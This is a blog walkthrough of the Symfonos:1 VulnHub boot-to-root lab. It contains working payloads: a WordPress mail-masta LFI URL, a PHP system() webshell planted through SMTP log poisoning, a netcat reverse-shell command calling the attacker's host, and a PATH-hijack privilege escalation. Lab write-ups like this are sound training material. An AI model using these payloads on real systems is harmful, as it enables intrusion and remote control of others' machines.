<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Symfonos:1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/symfonos1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-07-07T16:26:50+00:00">July 7, 2019</time><time class="updated" datetime="2025-06-10T20:11:37+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is another post on vulnhub CTF “named as “symfonos” by Zayotic. It is designed for VMware platform, and it is a boot to root challenge where you have to find flags to finish the task assigned by the author.</span></p>
<p><span style="color: #000000;">You can download it from here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></span></p>
<p><span style="color: #000000;">Level: Beginner to Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">SMB Shares folder</span></li>
<li><span style="color: #000000;">Wpscan</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Exploiting WordPress again LFI</span></li>
<li><span style="color: #000000;">LFI to RCE via SMTP log Poising</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation </strong></span></p>
<ul>
<li><span style="color: #000000;">PATH Variable</span></li>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Scanning</strong></span></h3>
<p><span style="color: #000000;">Let’s start with network scanning to identify the IP of VM with the help of netdiscover.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LzXqNM3mGZw/XSIafIQ8uZI/AAAAAAAAfCc/g5Jb1tQaYigCIRA6YzVrpKfve7TStovqwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">So, we have our target IP 192.168.0.16. Now, let’s scan the services and ports via nmap.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.0.16</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ahrWuH_cx3I/XSIah8zuIMI/AAAAAAAAfDA/OJZc-UORn0IN3d7-YTEsKoauo3m0hC4ogCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration </strong></span></h3>
<p><span style="color: #000000;">After scanning, we go to network enumeration and for that I used enum4linux. Here I found a user account helios and share directory /anonymous &amp; /helios</span></p>
<pre class="lang:default decode:true">enum4linux 192.168.0.16</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E8v0X5gcaTU/XSIaiGjsX5I/AAAAAAAAfDI/yfEoKWy7Z18FVBOQuU9Mkg_1iT8ngYiygCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">So try to connect with the shared network for accessing the<em>/anonymous</em> directory by connecting through smb.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xKDWdLTI04k/XSIaiC3iYbI/AAAAAAAAfDE/BlIxnkt-WGIOHV7MWEslioPo6LfxFz6OACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">So, in this shared folder I found a text file that I had explored here as shown below. The <strong>/attention.txt</strong> file gave some hint for user password as highlighted in the image. Hopefully, we can use any of these passwords to access a shared folder /helios.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-68l9Cb_TOmA/XSIaipWkvBI/AAAAAAAAfDM/4aMU7UupqwsdEMUUe59PmoTrTEjsFdgSACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Further, I try to access /helios using “qwerty” as login password and then I explored other files research.txt and todo.txt, although the research.txt was not much helpful but todo.txt gave a hint for <strong><em>/h3l105</em></strong> that could be web file or web directory. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7lsjdWfWCIY/XSIajNUy1JI/AAAAAAAAfDQ/Wn42GTiUQP0C-g1LNMhOew9HJwwhb1ADwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">So, navigate to a web browser to access <strong><em>/h3l105</em></strong> and found it as a WordPress website </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9zCwTtSzWuQ/XSIaj5KYCCI/AAAAAAAAfDY/vwYJi5N0XUAAZoPdTjDNzkBGD0bz3MEugCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Then I have added the host inside /etc/hosts file and move ahead for scanning vulnerability.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QiBEZqPRisk/XSIaj6t0MTI/AAAAAAAAfDU/xLk79tWw6u0teZB8NzNdooqg6qdSgVLogCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Further, we used wpscan for vulnerability scanning on the website. To do so we run the following command:</span></p>
<pre class="lang:default decode:true">wpscan --url http://symfonos.local/h3l105/ --enumerate p</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tPyiHdRgXrc/XSIaj0ObuqI/AAAAAAAAfDc/eHtJIeED6XkV8sgcDnazEXJBGkyAV150wCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Wpscan has shown the exploit is available for a plugin which is vulnerable to LFI (Local File Inclusion). </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-W_XvgfCQbTE/XSIafQo6hfI/AAAAAAAAfCg/Ay4lMyEKDhoRgG91LPQfBqGCDFA5NdhpwCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">On exploring the following link, we got proof-of-concept would be to load passwd file.</span></p>
<p><strong><span style="color: #000000;">https://www.exploit-db.com/exploits/40290</span></strong></p>
<pre class="lang:default decode:true">http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Bbf67JeLQDM/XSIafZqC5bI/AAAAAAAAfCk/KlAg-ayb50gwzcvMexmsGNVlSmBExEU0QCLcBGAs/s1600/11.1.png"/></span></p>
<p><span style="color: #000000;">As a result, we have accessed the passwd file and it proved that this site is vulnerable to LFI. Now through this LFI, I will try to create Remote code execution.</span></p>
<pre class="lang:default decode:true ">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bzt_Uv5Zd0c/XSIafxh_ccI/AAAAAAAAfCo/yz474KNtqo8JGj2c6lKCL82KO2igeYc7gCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">To escalate LFI to RCE we can use SMTP log poison approach and therefore we connect to SMTP service via telnet and they type the following command to inject malicious php code.</span></p>
<pre class="lang:default decode:true">telnet 192.168.0.16 25</pre>
<p><span style="color: #000000;">As we can see, we got connected to the victim machine successfully. Now let’s try to send a mail via the command line (CLI) of this machine and inject malicious php code via data.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hCDfmijdpA4/XSIagEpmWbI/AAAAAAAAfCs/rJ7eveL0JiMQ4OcuAnMogZrM3ISowZjJACLcBGAs/s1600/12.png"/></span></p>
<pre class="lang:default decode:true">&lt;?php system($_GET['c']); ?&gt;</pre>
<p><span style="color: #000000;">As our goal is to inject PHP code into the logs and this stage is called logfile poisoning and we can clearly see that details of mail.log, as well as execute comment given through cmd (c); now execute id as cmd comment to verify user-id and confirm its result from inside the given screenshot.</span></p>
<pre class="lang:default decode:true">http:symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;c=id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rkT_QQq3mNU/XSIagh5KPJI/AAAAAAAAfCw/PBQPOjTQeX0CGEyr2PxbJ1_Vd1szosVggCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">This technique is known as <a style="color: #000000;" href="https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/">SMTP log poisoning</a> and through such type of vulnerability, we can easily take the reverse shell of the victim’s machine.</span></p>
<p><span style="color: #000000;">Therefore, execute the following URL to run netcat reverse command and start netcat listener on kali:</span></p>
<pre class="lang:default decode:true ">http:symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;c=nc -e /bin/sh 192.168.0.10 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iG9dr9iYqM4/XSIag_pVjHI/AAAAAAAAfC0/TgizuZ0Xdj4NK4zagD14xnLwV04zsJ9sACLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Wow!! We got a reverse connection on netcat as shown in the below image. Further, we need to escalate the privilege from low privilege shell to higher.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234</pre>
<p><span style="color: #000000;">Therefore, on spawning local shell I use find command to identify SUID enable binaries. Here I found SUID bit, is enabled for /opt/statuscheck.</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">Further, we use string command for extracting metadata of statuscheck where it was trying to call curl but get a fatal error when program executes. Such type of error occurs due to missing path variable in the current directory.</span></p>
<p><span style="color: #000000;">To know more, read from here: <a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">Linux Privilege Escalation Using PATH Variable</a></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PhcL0K0E3x4/XSIahMgvifI/AAAAAAAAfC4/2viXDzNr7Wcq-adSW5X3qIMwX_WBXGN9gCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Taking advance of this loophole we try to export path for rouge curl which will call /bin/bash on executing the statuscheck program</span></p>
<pre class="lang:default decode:true ">cd /tmp
echo "/bin/sh" &gt; curl
chmod 777 curl
echo $PATH
export PATH=/tmp:$PATH
/opt/statuscheck
id
cd /root
cat proof.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QK9fTIdvhtA/XSIahXcFM3I/AAAAAAAAfC8/2dFKmKhF9Jc0UePgSyyN09E8S816JRkJQCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
